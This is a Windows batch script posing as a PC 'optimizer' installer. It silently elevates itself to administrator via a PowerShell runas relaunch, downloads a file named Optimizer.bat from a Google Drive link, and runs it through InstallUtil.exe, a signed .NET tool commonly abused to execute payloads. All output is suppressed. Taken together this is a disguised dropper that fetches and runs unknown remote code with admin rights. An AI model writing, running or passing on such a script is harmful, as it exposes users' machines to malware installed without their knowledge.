@echo off
reg add HKLM /F >nul 2>&1
if %errorlevel% neq 0 start "" /wait /I /min powershell -NoProfile -Command start -verb runas "'%~s0'" && exit /b

mkdir C:\OptimizerFiles
curl -g -L -# -o "C:\OptimizerFiles\Optimizer.bat" "https://drive.google.com/u/0/uc?id=106vgAgCrfLuRVSp7zFzYovCLyDsh5uRX&export=download&confirm=t&uuid=12220dbe-c063-4c1e-9a15-3c9185e6af22&at=ACjLJWmt5rUAY6ocDLCXkEvOY-Sc:1672625671864" >nul 2>&1
		%windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /i Optimizer.bat